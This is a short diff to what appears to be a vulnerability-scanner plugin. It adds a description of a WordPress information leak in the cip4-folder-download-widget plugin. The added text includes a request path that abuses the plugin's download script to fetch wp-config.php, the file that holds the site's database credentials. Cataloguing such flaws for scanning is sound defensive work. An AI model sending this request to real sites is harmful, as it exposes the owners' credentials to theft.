@@ -10,6 +10,8 @@ class Vuln(ABVuln):
     type = VulnType.INFO_LEAK # 漏洞类型
     disclosure_date = ''  # 漏洞公布时间
     desc = '''
+        WordPress 信息泄露。
+        /wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php
     '''  # 漏洞描述
     ref = ''  # 漏洞来源
     cnvd_id = ''  # cnvd漏洞编号
